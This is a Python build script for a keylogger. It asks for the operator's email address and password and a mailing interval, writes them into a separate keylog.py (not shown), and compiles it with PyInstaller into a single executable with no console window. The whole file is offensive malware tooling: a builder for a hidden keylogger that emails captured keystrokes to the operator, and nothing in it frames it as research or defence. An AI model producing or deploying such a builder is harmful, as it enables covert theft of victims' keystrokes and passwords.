import os
import sys
import shutil

def replaceFileContent(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)

print('This script is to be run on linux ONLY.\n')

yourmail = input('Enter your email ID > ')
yourpass = input('Enter your email Password > ')
print('You can use this website to convert hours / minutes to seconds: https://www.inchcalculator.com/convert/time/')
thetime = input('How many seconds do you want to wait till the next mail is sent? > ')

listing = os.listdir()

if 'keylog.py' in listing:
	pass
else:
	print("The file 'keylog.py' is not present. Exitting now....")
	sys.exit(1)

os.mkdir('compiledir')
os.system('cp keylog.py compiledir/keylog.py')
os.chdir('compiledir')


replaceFileContent('keylog.py', 'YOURMAILHERE', yourmail)
replaceFileContent('keylog.py', 'YOURPASSHERE', yourpass)
replaceFileContent('keylog.py', 'AMOUNTOFTIMEHERE', thetime)

os.system('pyinstaller --onefile --noconsole keylog.py')

os.system('cd ..; cp compiledir/dist/keylog .')
os.chdir('../')
shutil.rmtree('compiledir')

print('\nCompiled. Executable is present in current dir.')